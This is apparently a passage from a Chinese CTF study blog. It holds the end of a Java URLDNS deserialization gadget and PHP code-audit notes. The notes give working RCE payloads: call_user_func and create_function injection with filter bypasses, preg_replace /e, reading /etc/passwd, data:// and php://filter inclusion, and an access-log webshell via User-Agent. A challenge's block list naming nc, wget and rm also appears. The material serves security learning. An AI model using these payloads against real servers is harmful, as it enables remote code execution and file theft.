HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//这里不能发起请求，通过反射将url对象的hashcode改成不是一</span></span><br><span class="line">        filed.set(url1, <span class="number">123</span>);</span><br><span class="line">        <span class="comment">//同样这里需要通过反射改成一才能继续执行</span></span><br><span class="line">        hashMap.put(url1, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        filed.set(url1, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runReadobject</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(outputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">data</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(data);  </span><br><span class="line">oos.writeObject(obj);  </span><br><span class="line">oos.flush();  </span><br><span class="line">oos.close();  </span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://28bc736c-f956-4721-8651-efc6e2beb94a.challenge.ctf.show/&quot;</span>);  </span><br><span class="line">Class&lt;?&gt; c=url.getClass();  </span><br><span class="line">Field hashcode=c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">hashcode.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">hashcode.set(url,<span class="number">1</span>);  </span><br><span class="line">HashMap&lt;URL,Integer&gt; h = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();  </span><br><span class="line">h.put(url,<span class="number">1</span>);  </span><br><span class="line">hashcode.set(url,-<span class="number">1</span>);  </span><br><span class="line">serialize(h);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计</title>
    <url>/2024/04/03/php%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p> php代码审计小结</p>
<span id="more"></span>

<p>手册</p>
<ul>
<li>PHP官方手册： <a href="https://www.php.net/manual/zh/">https://www.php.net/manual/zh/</a></li>
<li>PHP函数参考： <a href="https://www.php.net/manual/zh/funcref.php">https://www.php.net/manual/zh/funcref.php</a></li>
<li>菜鸟教程： <a href="https://www.runoob.com/php/php-tutorial.html">https://www.runoob.com/php/php-tutorial.html</a></li>
<li>w3school： <a href="https://www.w3school.com.cn/php/index.asp">https://www.w3school.com.cn/php/index.asp</a></li>
</ul>
<h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><p>常用输出函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 输出一个字符串或变量，但是不能输出数组。</span><br><span class="line"></span><br><span class="line">print_r()  输出一个数组。</span><br><span class="line"></span><br><span class="line">var_dump() 输出一个变量的结构，这个变量包含普通变量，数组，对象等</span><br><span class="line"></span><br><span class="line">get_defined_vars(void)此函数返回一个包含当前可用的变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure>

<p>在函数中使用此函数可以调试函数中的变量，而不会返回其他的变量。</p>
<p><a href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html</a></p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>systemsystem()exec()shell_exec()passthru()pcntl_exec()popen()proc_open()</p>
<p>用于打开一个到外部命令的管道。允许你与外部命令进行读或写操作（但不同时支持两者）。返回一个文件指针，可用于进一步的 fread 或 fwrite 操作。使用 pclose 来关闭管道并获取命令的退出状态。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pcntl_exec(&quot;/bin/cat&quot;,array(&quot;/etc/passwd));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=popen(&quot;bin/cat,/etc/passwd&quot;,&quot;r&quot;);$b=fread($a,2096);echo $b;pclose($a);</span><br></pre></td></tr></table></figure>

<p>ob_start() 是 PHP 的一个函数，用于开启输出缓冲。这意味着脚本的输出（如 echo）不会立即发送到浏览器，而是存储在内部缓冲区中。这允许在输出发送到浏览器前对其进行修改。使用 ob_end_flush() 来发送缓冲区内容至浏览器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start(&quot;system&quot;);</span><br><span class="line">echo &quot;whoami&quot;;</span><br><span class="line">ob_end_flush();?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><p>遍历 <code>array</code> 数组中的每个值，并将每个值传递给 <code>callback</code> 回调函数。 如果 <code>callback</code> 回调函数返回 **<code>true</code>**，则将 <code>array</code> 数组中的当前值返回到结果 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a> 数组中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_filter(array $array,  $callback )</span><br><span class="line">array   要遍历的数组</span><br><span class="line">callback  使用的回调函数</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>回调函数的一些使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, ...<span class="variable">$parameters</span>);</span><br><span class="line">...<span class="variable">$parameters</span>的值为<span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;whoami&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=system&amp;1=whoami</span><br></pre></td></tr></table></figure>

<p>PHP 在用户自定义函数中支持可变数量的参数列表。由 <code>...</code> 语法实现。</p>
<p>包含 <code>...</code> 的参数，会转换为指定参数变量的一个 array：</p>
<p><strong>unset()</strong> 函数用于销毁给定的变量</p>
<h3 id="拓展2"><a href="#拓展2" class="headerlink" title="拓展2"></a>拓展2</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>)(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=current&amp;a=current</span><br><span class="line">post:a[]=system&amp;b=whoami</span><br></pre></td></tr></table></figure>

<h3 id="拓展3"><a href="#拓展3" class="headerlink" title="拓展3"></a>拓展3</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class A&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=A::f</span><br><span class="line">post:a=whoami</span><br></pre></td></tr></table></figure>

<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>ctfshow 147</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET ?show=;&#125;;system(&#x27;grep flag flag.php&#x27;);/*</span><br><span class="line">POSOT ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>

<h2 id="pre-replace"><a href="#pre-replace" class="headerlink" title="pre_replace"></a>pre_replace</h2><p><a href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_系列漏洞小结 | 国光 (sqlsec.com)</a></p>
<p>php5.5 之后废除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>另一个版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]);</span><br></pre></td></tr></table></figure>

<p>传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=/zhou/e&amp;b=system(&#x27;cat /flag&#x27;)&amp;c=zhou</span><br></pre></td></tr></table></figure>



<h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h2><p><strong>array_map()</strong> 返回一个 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a>，包含将 <code>array</code> 的相应值作为回调的参数顺序调用 <code>callback</code> 后的结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cube</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;cube&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">    [1] =&gt; 8</span><br><span class="line">    [2] =&gt; 27</span><br><span class="line">    [3] =&gt; 64</span><br><span class="line">    [4] =&gt; 125</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="variable">$old_array</span>[<span class="number">0</span>] = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$old_array</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$new_array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag:/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shaw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>];</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z_]*$/isD&#x27;</span>,<span class="variable">$shaw</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rm|ch|nc|net|ex|\-|de|cat|tac|strings|h|wget|\?|cp|mv|\||so|\$/i&#x27;</span>,<span class="variable">$root</span>))&#123;</span><br><span class="line">            <span class="variable">$shaw</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$root</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Almost there^^&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?root=;&#125;system(&#x27;ca\t /f*&#x27;);/*</span><br><span class="line">shaw=create_function</span><br></pre></td></tr></table></figure>



<p>这里使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(dirname(__FILE__)));查看当前目录下文件</span><br><span class="line">然后找到flag.php</span><br><span class="line">print_r(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">之后高亮显示即可</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br></pre></td></tr></table></figure>

<p>方法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>方法三</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(session_id(session_start()));，别忘了修改Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<p>方法四</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br><span class="line">passid=ls</span><br></pre></td></tr></table></figure>

<p>方法五</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv()))))); </span><br></pre></td></tr></table></figure>

<p>方法六</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line">或者</span><br><span class="line">readfile(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>方法七</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(var_dump(end(getallheaders())));</span><br></pre></td></tr></table></figure>

<p>方法八</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval(end(current(get_defined_vars())));&amp;a=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><p><strong><code>__FILE__</code></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo __FILE__ ; // 取得当前文件的绝对地址，结果：D:\www\test.php </span><br><span class="line"></span><br><span class="line">echo dirname(__FILE__); // 取得当前文件所在的绝对目录，结果：D:\www\ </span><br><span class="line"></span><br><span class="line">echo dirname(dirname(__FILE__)); //取得当前文件的上一层目录名，结果：D:\ </span><br></pre></td></tr></table></figure>

<p><strong>scandir</strong></p>
<p>(PHP 5, PHP 7, PHP 8)</p>
<p> 列出指定路径中的文件和目录，返回 array，包含有 <code>directory</code> 中的文件和目录。</p>
<p><strong>array_reverse()</strong> 接受数组 <code>array</code> 作为输入并返回一个单元为相反顺序的新数组。</p>
<p><strong>next</strong>  将数组中的内部指针向前移动一位</p>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$transport = array(&#x27;foot&#x27;, &#x27;bike&#x27;, &#x27;car&#x27;, &#x27;plane&#x27;);</span><br><span class="line">$mode = current($transport); // $mode = &#x27;foot&#x27;;</span><br><span class="line">$mode = next($transport);    // $mode = &#x27;bike&#x27;;</span><br><span class="line">$mode = next($transport);    // $mode = &#x27;car&#x27;;</span><br><span class="line">$mode = prev($transport);    // $mode = &#x27;bike&#x27;;</span><br><span class="line">$mode = end($transport);     // $mode = &#x27;plane&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>session_id()</strong> </p>
<p>返回当前会话ID。 如果当前没有会话，则返回空字符串（<code>&quot;&quot;</code>）。失败时返回 **<code>false</code>**。</p>
<p><strong>localeconv()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [decimal_point] =&gt; .</span><br><span class="line">    [thousands_sep] =&gt;</span><br><span class="line">    [int_curr_symbol] =&gt; EUR</span><br><span class="line">    [currency_symbol] =&gt; €</span><br><span class="line">    [mon_decimal_point] =&gt; ,</span><br><span class="line">    [mon_thousands_sep] =&gt;</span><br><span class="line">    [positive_sign] =&gt;</span><br><span class="line">    [negative_sign] =&gt; -</span><br><span class="line">    [int_frac_digits] =&gt; <span class="number">2</span></span><br><span class="line">    [frac_digits] =&gt; <span class="number">2</span></span><br><span class="line">    [p_cs_precedes] =&gt; <span class="number">1</span></span><br><span class="line">    [p_sep_by_space] =&gt; <span class="number">1</span></span><br><span class="line">    [n_cs_precedes] =&gt; <span class="number">1</span></span><br><span class="line">    [n_sep_by_space] =&gt; <span class="number">1</span></span><br><span class="line">    [p_sign_posn] =&gt; <span class="number">1</span></span><br><span class="line">    [n_sign_posn] =&gt; <span class="number">2</span></span><br><span class="line">    [grouping] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line">    [mon_grouping] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">3</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>也就是返回  .</p>
<p><strong>readfile</strong></p>
<p>读取文件并写入到输出缓冲。</p>
<p><strong>getcwd()取得当前工作目录。</strong></p>
<p>**pos 此函数是该函数的别名：current()**\</p>
<p><strong>array_flip()</strong> 返回一个反转后的 array，例如 <code>array</code> 中的键名变成了值，而 <code>array</code> 中的值成了键名。</p>
<p><strong>getallheaders</strong> ()</p>
<p>获取当前请求的所有请求头信息。</p>
<p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效</p>
<p><strong>get_defined_vars()</strong></p>
<p>此函数返回多维数组。包含调用 <strong>get_defined_vars()</strong> 作用域内所有已定义的变量、环境变量、服务器变量、用户定义变量列表。</p>
<p><strong>session_id()</strong></p>
<p>可以获取PHPSESSID的值</p>
<h3 id="读取目录："><a href="#读取目录：" class="headerlink" title="读取目录："></a>读取目录：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(&quot;/&quot;));</span><br><span class="line">print_r(glob(&quot;*&quot;)); // 列当前目录</span><br><span class="line">print_r(glob(&quot;/*&quot;)); // 列根目录</span><br><span class="line">print_r(scandir(&quot;.&quot;));</span><br><span class="line">print_r(scandir(&quot;/&quot;));</span><br><span class="line">$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;</span><br><span class="line">$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;</span><br><span class="line">$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>

<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file($filename);</span><br><span class="line"></span><br><span class="line">show_source($filename);</span><br><span class="line"></span><br><span class="line">print_r(php_strip_whitespace($filename));</span><br><span class="line"></span><br><span class="line">print_r(file_get_contents($filename));</span><br><span class="line"></span><br><span class="line">readfile($filename);</span><br><span class="line"></span><br><span class="line">print_r(file($filename)); // var_dump</span><br><span class="line"></span><br><span class="line">fread(fopen($filename,&quot;r&quot;), $size);</span><br><span class="line"></span><br><span class="line">include($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">include_once($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">require($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">require_once($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));</span><br><span class="line"></span><br><span class="line">print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行</span><br><span class="line"></span><br><span class="line">fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOF</span><br><span class="line"></span><br><span class="line">print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));</span><br><span class="line"></span><br><span class="line">print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="line"></span><br><span class="line">print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));</span><br><span class="line"></span><br><span class="line">print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</span><br></pre></td></tr></table></figure>

<h2 id="括号过滤"><a href="#括号过滤" class="headerlink" title="括号过滤"></a>括号过滤</h2><p>nclude不用括号，分号可以用?&gt;代替,伪协议文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>方法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>方法三,日志包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=/var/log/nginx/access.log</span><br><span class="line">User-Agent: &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="eval-注释符绕过"><a href="#eval-注释符绕过" class="headerlink" title="eval 注释符绕过"></a>eval 注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a %0d ?&gt; </span><br></pre></td></tr></table></figure>

